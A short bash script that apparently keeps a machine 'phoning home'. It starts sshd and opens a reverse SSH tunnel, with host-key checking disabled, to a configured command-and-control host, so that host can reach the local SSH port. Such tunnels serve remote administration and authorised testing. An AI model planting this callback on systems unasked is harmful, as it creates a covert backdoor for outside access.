#!/bin/bash

cd /opt/ssh-phone-home

# Import the configuration variables
CNC_IP=$(grep "CNC_IP" config | cut -d '=' -f 2)
CNC_PORT=$(grep "CNC_PORT" config | cut -d '=' -f 2)
DBUSER=$(grep "DBUSER" config | cut -d '=' -f 2)
DBPORT=$(grep "DBPORT" config | cut -d '=' -f 2)

if ps -ef | grep sshd | grep -v grep ; then
   echo "SSHD is running"
else
   echo "SSHD isn't running"
   service ssh start
fi

if netstat -antp|grep ":"$CNC_PORT".\+ESTABLISHED.\+/ssh" ; then 
    echo "CNC Connection is UP"
else
    echo "CNC Connection is DOWN"

    ## Connect to the C&C ##
    echo Connecting...
    ssh -nNT -i id_rsa $DBUSER@$CNC_IP -p $CNC_PORT -o StrictHostKeyChecking=no -R $DBPORT:127.0.0.1:22 &
fi

